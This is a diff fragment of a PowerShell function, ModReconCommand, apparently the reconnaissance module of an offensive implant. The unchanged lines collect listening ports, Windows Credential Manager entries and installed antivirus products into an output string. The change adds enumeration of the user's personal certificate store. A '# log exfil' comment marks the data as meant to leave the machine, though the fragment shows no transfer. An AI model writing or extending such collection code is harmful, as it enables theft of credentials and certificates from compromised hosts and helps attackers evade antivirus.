@@ -61,6 +61,8 @@ Function ModReconCommand {
 			$output = $output + "`n`n ======= Open ports:`n" + ((netstat -an | select-string -pattern "listening")  -join "`r`n") 
 			$output = $output + "`n`n ======= Credentials Manager:`n" + ((cmdkey /list)  -join "`r`n") 
 			$output = $output + "`n`n ======= Antivirus:`n" + ((Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | out-string)  -join "`r`n")
+			$output = $output + "`n`n ======= Certificates Store:`n" + ((Get-ChildItem Cert:\CurrentUser\My)  -join "`r`n") 
+			
 			# log exfil
 			echo "100%"
 			
